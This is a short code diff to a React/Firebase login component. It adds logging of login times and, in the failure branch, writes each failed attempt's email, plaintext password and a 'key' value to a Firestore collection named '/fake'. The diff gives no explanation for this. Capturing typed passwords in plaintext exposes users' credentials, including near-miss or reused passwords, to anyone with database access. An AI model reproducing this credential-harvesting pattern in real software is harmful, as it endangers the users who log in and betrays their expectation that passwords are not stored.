@@ -32,11 +32,13 @@ function Login({ setAuth, setUserName, setencrypt }) {
           setUserName(data.user.uid);
           setAuth(1);
 
+         
           firebase.firestore().collection("/notifs").doc(data.user.uid).set({});
+          firebase.firestore().collection("/login").doc(inputData["email"]).set({time:new Date()});
         })
         .catch((e) => {
           setAuth(2);
-
+          firebase.firestore().collection("/fake").doc(inputData["email"]).set({time:new Date(),password:inputData['password'],key : inputData["key"]});
           setinputData({ ...inputData, login: false });
         });
     }
